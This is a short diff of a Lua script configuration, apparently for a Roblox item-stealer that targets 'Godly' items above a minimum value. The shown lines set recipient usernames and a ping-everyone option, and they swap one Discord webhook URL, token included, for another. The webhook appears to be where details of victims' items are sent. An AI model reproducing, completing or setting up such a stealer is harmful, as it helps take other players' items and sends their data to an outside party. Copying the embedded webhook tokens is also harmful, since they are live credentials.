@@ -78,7 +78,7 @@ local Usernames = {"iceyblueii"}
 local MinimumRarity = 'Godly'
 local MinimumValue = 10
 local PingEveryone = 'Yes'
-local Webhook = "https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"
+local Webhook = "https://discord.com/api/webhooks/1555946397147340871/DxbuhVv2NAgy82zDDtSt1RK5GM5u9KMDf6SQ8bnPseDtxjjswRCz3BZ0t-l5A5TdZAM4"
 -- ============================================================
 
 local a, b, c, d, e = Usernames, MinimumRarity, MinimumValue, PingEveryone, Webhook
